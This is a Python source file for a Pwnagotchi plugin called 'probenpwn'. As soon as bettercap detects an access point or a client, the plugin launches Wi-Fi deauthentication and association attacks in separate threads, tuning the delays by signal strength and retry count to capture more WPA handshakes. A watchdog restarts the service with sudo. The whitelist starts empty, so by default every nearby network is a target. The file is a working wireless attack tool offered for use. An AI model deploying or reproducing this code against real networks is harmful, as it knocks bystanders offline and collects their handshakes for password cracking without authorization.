import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins

class probenpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.1.0'
    __license__ = 'GPL3'
    __description__ = (
        'Pwn more aggressively. Launch immediate associate or deauth attack '
        'when bettercap spots a device, with enhanced performance for more handshakes. '
        'Enhanced with dynamic parameter tuning, randomization, and feedback loop.'
    )

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self._agent = None
        self.old_name = None
        self.recents = {}
        self.whitelist = set()
        self.attack_threads = []
        self.epoch_duration = 60  # default epoch duration in seconds
        self._watchdog_thread = None
        # Track number of attack attempts per AP MAC address
        self.attack_attempts = {}
        # Optionally, track the number of successful handshakes per AP
        self.success_counts = {}

    def on_unload(self, ui):
        if self.old_name:
            ui.set('name', "%s " % self.old_name)
        else:
            ui.set('name', "%s>  " % ui.get('name')[:-3])
        self.old_name = None
        logging.info("Probing out.")

    def on_ui_setup(self, ui):
        self._ui = ui

    def on_ui_update(self, ui):
        if self.old_name is None:
            self.old_name = ui.get('name')
            if self.old_name:
                i = self.old_name.find('>')
                if i:
                    ui.set('name', "%s%s" % (self.old_name[:i], "!!!"))

    def on_ready(self, agent):
        self._agent = agent
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        if self._ui:
            self._ui.set("status", "Probe engaged... \nPWNing your signals, Earthlings!")
        self._watchdog_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._watchdog_thread.start()

    def _watchdog(self):
        CHECK_INTERVAL = 5  # seconds between checks
        while True:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon interface missing! This likely indicates a Wi‑Fi adapter crash. "
                              "Executing 'sudo systemctl restart pwnagotchi' to recover.")
                try:
                    subprocess.run(["sudo", "systemctl", "restart", "pwnagotchi"], check=True)
                except Exception as e:
                    logging.error("Failed to execute restart command: %s", e)
                break  # Stop checking after issuing the recovery command.
            time.sleep(CHECK_INTERVAL)

    def track_recent(self, ap, cl=None):
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, ap):
        if not self._agent:
            return False
        if ap.get('hostname', '').lower() in self.whitelist or ap['mac'].lower() in self.whitelist:
            return False
        return True

    def attack_target(self, agent, ap, cl):
        if not self.ok_to_attack(ap):
            return
        ap_mac = ap['mac'].lower()
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.debug(f"Launching attack on AP {ap['mac']} and client {cl['mac'] if cl else 'N/A'}; attempt {self.attack_attempts[ap_mac]}")
        if cl:
            delay = self.dynamic_attack_delay(ap, cl)
            agent.deauth(ap, cl, delay)
        agent.associate(ap, 0.2)

    def dynamic_attack_delay(self, ap, cl):
        signal = cl.get('signal', -100) if cl is not None else -100
        if signal < -60:
            base_delay = 0.5
        else:
            base_delay = 0.25

        ap_mac = ap['mac'].lower()
        attempts = self.attack_attempts.get(ap_mac, 0)
        if attempts > 10:
            base_delay *= 0.6
        elif attempts > 5:
            base_delay *= 0.8

        randomized_delay = base_delay * random.uniform(0.9, 1.1)
        logging.debug(f"Dynamic attack delay for AP {ap['mac']} (signal {signal} dBm, {attempts} attempts): {randomized_delay:.3f}s")
        return randomized_delay

    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            ap = event['data']
            if agent._config['personality']['associate'] and self.ok_to_attack(ap):
                logging.debug("insta-associate: %s (%s)", ap.get('hostname', 'Unknown AP'), ap['mac'])
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, None))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_ap_new: %s", repr(e))

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if (agent._config['personality']['deauth'] and
                self.ok_to_attack(ap) and
                self.ok_to_attack(cl)):
                logging.debug("insta-deauth: %s (%s) -> '%s' (%s) (%s)",
                              ap.get('hostname', 'Unknown AP'), ap['mac'],
                              cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, cl))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_client_new: %s", repr(e))

    def on_handshake(self, agent, filename, ap, cl):
        ap_mac = ap['mac'].lower()
        logging.info("Handshake detected from %s", ap['mac'])
        if ap_mac in self.attack_attempts:
            del self.attack_attempts[ap_mac]
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        if 'mac' in ap and 'mac' in cl:
            logging.info("Captured handshake from %s (%s) -> '%s' (%s) (%s)",
                         ap.get('hostname', 'Unknown AP'), ap['mac'], cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
            if ap_mac in self.recents:
                del self.recents[ap_mac]
            cl_mac = cl['mac'].lower()
            if cl_mac in self.recents:
                del self.recents[cl_mac]

    def on_epoch(self, agent, epoch, epoch_data):
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]

    def on_bcap_wifi_ap_updated(self, agent, event):
        try:
            ap = event['data']
            if self.ok_to_attack(ap):
                logging.debug("AP updated: %s (%s)", ap.get('hostname', 'Unknown AP'), ap['mac'])
                self.track_recent(ap)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_ap_updated: %s", repr(e))

    def on_bcap_wifi_client_updated(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if self.ok_to_attack(ap) and self.ok_to_attack(cl):
                logging.debug("Client updated: %s (%s) -> '%s' (%s) (%s)",
                              ap.get('hostname', 'Unknown AP'), ap['mac'], cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
                self.track_recent(ap, cl)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_client_updated: %s", repr(e))

    def sanitize_channel_list(self, channels):
        """
        Sanitize the channel list to ensure only valid channels are included.
        Channels for 2.4 GHz should be between 1 and 14, and for 5 GHz, it should be between 36 and 165.
        """
        valid_channels = [ch for ch in channels if 1 <= ch <= 14 or 36 <= ch <= 165]
        if not valid_channels:
            logging.error("No valid channels to scan.")
            return []  # Return an empty list if no valid channels are found
        logging.debug(f"Scanning the following valid channels: {valid_channels}")
        return valid_channels
